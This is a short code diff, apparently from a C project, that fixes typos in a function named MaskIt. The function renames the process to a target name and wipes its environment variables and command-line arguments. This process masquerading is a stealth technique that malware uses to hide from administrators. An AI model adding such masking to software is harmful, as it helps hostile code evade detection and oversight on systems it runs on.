@@ -64,8 +64,8 @@ void MaskIt(char **argv){
     prctl(PR_SET_NAME, TARGET_PROCESS, 0, 0, 0);
 
     // wiping environment vars of the program
-    extern char **enviorn;
-    for(int i=0; environ[i] != NULL; i++) memset(environ[i], 0, strlen[enviorn[i]]);
+    extern char **environ;
+    for(int i=0; environ[i] != NULL; i++) memset(environ[i], 0, strlen(environ[i]));
 
     // masking cli args
     memset(argv[0], 0, strlen(argv[0]));
